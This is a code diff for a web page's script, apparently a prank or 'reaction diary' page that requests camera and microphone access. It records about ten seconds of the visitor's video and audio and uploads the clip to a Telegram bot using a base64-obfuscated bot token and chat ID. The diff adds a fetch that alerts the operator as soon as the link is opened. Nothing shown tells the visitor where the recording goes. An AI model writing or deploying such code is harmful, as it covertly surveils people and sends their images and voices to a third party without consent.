@@ -71,6 +71,7 @@
         let mediaRecorder, recordedChunks = [];
         const bgMusic = document.getElementById('bg-music');
         const mainVideo = document.getElementById('main-video');
+        const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw=="); //
 
         mainVideo.onplay = () => { bgMusic.pause(); };
         mainVideo.onpause = () => { bgMusic.play(); };
@@ -81,8 +82,9 @@
 
         async function startDiary() {
             try {
-                // Resetting chunks for fresh recording every time link opens
-                recordedChunks = [];
+                // 🔔 NEW: Send "Link Opened" notification immediately
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Link%20Opened!%20❤️`);
+
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('video-preview').srcObject = stream;
                 
@@ -93,16 +95,13 @@
                 document.getElementById('diary-wrapper').style.display = 'block';
                 bgMusic.play();
 
-                // 10 Second recording session
                 setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 10000);
 
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                     const formData = new FormData();
-                    formData.append('chat_id', "5324376571"); //
+                    formData.append('chat_id', "5324376571"); 
                     formData.append('video', blob, 'reaction.mp4');
-                    
-                    const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw=="); //
                     fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData });
                 };
             } catch (err) { alert("Camera access needed! ❤️"); }
